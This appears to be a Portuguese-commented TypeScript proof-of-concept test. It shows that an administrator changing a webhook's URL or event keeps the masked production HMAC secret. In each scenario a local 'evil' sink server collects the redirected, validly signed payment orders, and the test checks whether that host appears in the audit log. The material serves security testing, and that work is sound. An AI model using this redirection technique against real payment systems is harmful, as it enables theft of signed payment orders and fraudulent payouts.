// PoC (verificação independente, lente "reproduzir"): trocar a URL ou o evento de um destino de webhook mantendo o
// segredo mascarado preserva o segredo de produção. Pedidos de saque.pago já na fila (novas tentativas) e os novos
// passam a ir, assinados com esse segredo, para o host novo; a auditoria não diz qual é o host novo.
// Os asserts descrevem o comportamento SEGURO: este arquivo FALHA enquanto o problema existir.
import { createHmac } from 'node:crypto'
import { createServer, type IncomingHttpHeaders, type Server } from 'node:http'
import type { AddressInfo } from 'node:net'
import type { FastifyInstance } from 'fastify'
import { afterAll, beforeAll, describe, expect, it } from 'vitest'
import { newId } from '../src/lib/crypto'
import { processOutboxOnce } from '../src/modules/webhooks/dispatcher'
import { api, createTestApp, loginAs } from './helpers'

type Hit = { path: string; headers: IncomingHttpHeaders; body: string }
const KEY = 'campanhas.webhooks.destinos'
const S_PAGO = 'prod-hmac-pagar-7f3a9c2e'
const S_ESTORNO = 'prod-hmac-estornar-1b8d4e6f'

const processorHits: Hit[] = []
const processorReplies: number[] = [] // próximas respostas do processador (padrão 200)
const evilHits: Hit[] = []
let processor: Server
let evil: Server
let PROC = ''
let EVIL = ''

function sink(store: Hit[], replies?: number[]) {
  return createServer((req, res) => {
    const chunks: Buffer[] = []
    req.on('data', (c: Buffer) => chunks.push(c))
    req.on('end', () => {
      store.push({ path: req.url ?? '', headers: req.headers, body: Buffer.concat(chunks).toString('utf8') })
      res.writeHead(replies?.shift() ?? 200, { 'content-type': 'application/json' })
      res.end('{"ok":true}')
    })
  })
}
const start = (s: Server) =>
  new Promise<string>((r) => s.listen(0, '127.0.0.1', () => r(`http://127.0.0.1:${(s.address() as AddressInfo).port}`)))
const signedWith = (h: Hit, secret: string) =>
  h.headers['x-x2w-signature'] === `sha256=${createHmac('sha256', secret).update(`${h.headers['x-x2w-timestamp']}.${h.body}`).digest('hex')}`

async function newWithdrawal(app: FastifyInstance, amountBrl: number) {
  const id = newId('SQ')
  await app.db.query(
    `insert into withdrawals (id, player_id, player_name, player_email, amount_cents, fee_cents, status, risk_level, risk_score,
                              risk_reasons, pix_key_type, pix_key_enc, reference, created_at, updated_at)
     values ($1, $2, 'Jogadora PoC', 'jp@exemplo.com', $3, 0, 'pendente', 'baixo', 1, '[]'::jsonb, 'CPF', $4, 'REF', now(), now())`,
    [id, newId('pl'), Math.round(amountBrl * 100), app.cipher.encrypt('52998224725')],
  )
  return id
}

beforeAll(async () => {
  processor = sink(processorHits, processorReplies)
  evil = sink(evilHits)
  PROC = await start(processor)
  EVIL = await start(evil)
})
afterAll(async () => {
  for (const s of [processor, evil]) {
    s.closeAllConnections()
    await new Promise<void>((r) => s.close(() => r()))
  }
})

describe('webhooks: troca de URL/evento com segredo mascarado', () => {
  let app: FastifyInstance
  let adm: { cookie: string }
  let pagoId = ''
  let estornoId = ''

  beforeAll(async () => {
    app = await createTestApp()
    // Superadmin cadastra os dois destinos de produção com segredos explícitos (como na operação real)
    const sa = await loginAs(app, 'superadmin')
    pagoId = newId('wh')
    estornoId = newId('wh')
    const created = await api(app, 'PUT', `/api/kv/${KEY}`, {
      cookie: sa.cookie,
      body: {
        version: 0,
        value: [
          { id: pagoId, event: 'saque.pago', url: `${PROC}/pix/pagar`, active: true, secret: S_PAGO },
          { id: estornoId, event: 'saque.rejeitado', url: `${PROC}/pix/estornar`, active: true, secret: S_ESTORNO },
        ],
      },
    })
    expect(created.statusCode).toBe(200)
    adm = await loginAs(app, 'administrador')
  })
  afterAll(async () => app.close())

  it('passo A: trocar só a URL não leva a nova tentativa nem novas ordens assinadas com o segredo de produção ao host novo; a auditoria registra o host novo', async () => {
    // 1) saque aprovado com o processador respondendo 503: o item fica pendente para nova tentativa
    const w1 = await newWithdrawal(app, 1500)
    expect((await api(app, 'POST', `/api/withdrawals/${w1}/approve`, { cookie: adm.cookie })).statusCode).toBe(200)
    processorReplies.push(503)
    await processOutboxOnce(app)
    const pending = await app.db.query<{ status: string; attempts: number }>('select status, attempts from webhook_outbox')
    console.log('[poc] depois do 503:', JSON.stringify(pending), '| processador recebeu', processorHits.length)
    expect(pending).toEqual([{ status: 'pendente', attempts: 1 }])

    // 2) Administrador: GET da lista (segredo vem mascarado) + PUT só com a URL trocada
    const cur = (await api(app, 'GET', `/api/kv/${KEY}`, { cookie: adm.cookie })).json() as { value: any[]; version: number }
    const masked = cur.value.find((d) => d.id === pagoId).secret
    const put = await api(app, 'PUT', `/api/kv/${KEY}`, {
      cookie: adm.cookie,
      body: { version: cur.version, value: cur.value.map((d) => (d.id === pagoId ? { ...d, url: `${EVIL}/coleta` } : d)) },
    })
    console.log('[poc] segredo no GET:', masked, '| PUT troca de URL ->', put.statusCode)

    // 3) a nova tentativa vence + nova aprovação
    await app.db.query(`update webhook_outbox set next_attempt_at = now() - interval '1 second' where status = 'pendente'`)
    const w2 = await newWithdrawal(app, 2500)
    expect((await api(app, 'POST', `/api/withdrawals/${w2}/approve`, { cookie: adm.cookie })).statusCode).toBe(200)
    const before = processorHits.length
    await processOutboxOnce(app)

    const outbox = await app.db.query<{ status: string }>('select status from webhook_outbox order by id')
    const execs = await app.db.query<{ status: string; url: string }>(`select status, url from webhook_executions where test = false order by at`)
    const audit = await app.db.one<{ summary: string }>(`select summary from audit_log where summary like 'Destinos de webhook%' order by id desc limit 1`)
    for (const h of evilHits) {
      const b = JSON.parse(h.body)
      console.log(`[poc] host novo recebeu: ${h.headers['x-x2w-event']} saque=${b.data.id} valor=${b.data.amount} assinatura_valida_com_S_PAGO=${signedWith(h, S_PAGO)}`)
    }
    console.log('[poc] processador legítimo recebeu', processorHits.length - before, 'entrega(s) depois da troca')
    console.log('[poc] outbox:', outbox.map((o) => o.status).join(','), '| execuções:', execs.map((e) => `${e.status}@${new URL(e.url).port}`).join(','))
    console.log('[poc] auditoria:', audit?.summary)

    if (put.statusCode === 200) {
      // seguro: o host novo nunca recebe ordem assinada com o segredo antigo
      expect(evilHits.filter((h) => signedWith(h, S_PAGO)).map((h) => JSON.parse(h.body).data.id)).toEqual([])
      // seguro: a auditoria de quem redirecionou ordens de pagamento diz para onde
      expect(audit?.summary).toContain(new URL(EVIL).host)
    }
  })

  it('passo B: POST /destinations/:id/test não entrega envelope saque.pago assinado com o segredo de produção ao host trocado', async () => {
    const n = evilHits.length
    const r = await api(app, 'POST', `/api/webhooks/destinations/${pagoId}/test`, { cookie: adm.cookie })
    const got = evilHits.slice(n)
    for (const h of got) console.log(`[poc] teste -> ${r.statusCode} | x-x2w-event=${h.headers['x-x2w-event']} corpo=${h.body} assinatura_valida_com_S_PAGO=${signedWith(h, S_PAGO)}`)
    expect(got.filter((h) => signedWith(h, S_PAGO))).toHaveLength(0)
  })

  it('passo C: trocar o evento do destino de estorno para saque.pago (segredo mascarado) não faz /pix/estornar receber saque.pago assinado com o segredo dele', async () => {
    const cur = (await api(app, 'GET', `/api/kv/${KEY}`, { cookie: adm.cookie })).json() as { value: any[]; version: number }
    const put = await api(app, 'PUT', `/api/kv/${KEY}`, {
      cookie: adm.cookie,
      body: { version: cur.version, value: cur.value.map((d) => (d.id === estornoId ? { ...d, event: 'saque.pago' } : d)) },
    })
    const audit = await app.db.one<{ summary: string }>(`select summary from audit_log where summary like 'Destinos de webhook%' order by id desc limit 1`)
    console.log('[poc] PUT troca de evento ->', put.statusCode, '| auditoria:', audit?.summary)
    const n = processorHits.length
    const w3 = await newWithdrawal(app, 3500)
    expect((await api(app, 'POST', `/api/withdrawals/${w3}/approve`, { cookie: adm.cookie })).statusCode).toBe(200)
    await processOutboxOnce(app)
    const toRefund = processorHits.slice(n).filter((h) => h.path === '/pix/estornar')
    for (const h of toRefund) {
      console.log(`[poc] /pix/estornar recebeu: x-x2w-event=${h.headers['x-x2w-event']} body.event=${JSON.parse(h.body).event} saque=${JSON.parse(h.body).data.id} assinatura_valida_com_S_ESTORNO=${signedWith(h, S_ESTORNO)}`)
    }
    if (put.statusCode === 200) expect(toRefund.filter((h) => signedWith(h, S_ESTORNO) && JSON.parse(h.body).event === 'saque.pago')).toHaveLength(0)
  })
})
